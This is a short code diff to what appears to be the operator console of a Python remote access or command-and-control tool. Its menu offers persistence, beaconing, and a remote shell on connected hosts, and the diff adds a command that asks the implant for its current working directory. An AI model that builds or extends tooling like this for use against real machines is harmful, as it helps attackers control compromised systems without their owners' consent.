@@ -10,7 +10,7 @@ from signal import SIGTERM
 import tasker
 
 VERBOSE = True
-
+CURRENT_WORKING_DIR = ""
 
 #IGNORE SSL CHECKS
 
@@ -228,8 +228,11 @@ def get_uuid(conn):
     else:
         return uuid
 
-
-
+def get_pwd(conn):
+    global CURRENT_WORKING_DIR
+    send_data(conn, "[pwd]")
+    CURRENT_WORKING_DIR = listen_for_data(conn,'store')
+    print_info(CURRENT_WORKING_DIR)
 
 def listen():
     global conn
@@ -241,6 +244,7 @@ def listen():
     4 - Drop Connection (start beaconing)
     5 - Persistence
     6 - Print uuid
+    7 - Print Working Directory
     shell - Start a Shell
     beacon - Change Beacon Settings"""
 
@@ -375,6 +379,8 @@ def listen():
                     uuid = get_uuid(conn)
                     print_good("Found UUID: {}".format(uuid))
                     cmd = ""
+                elif cmd == "7":
+                    get_pwd(conn)
                 elif cmd.lower() == "shell":
                     while cmd.lower() == "shell":
                         command = input("shell > ")
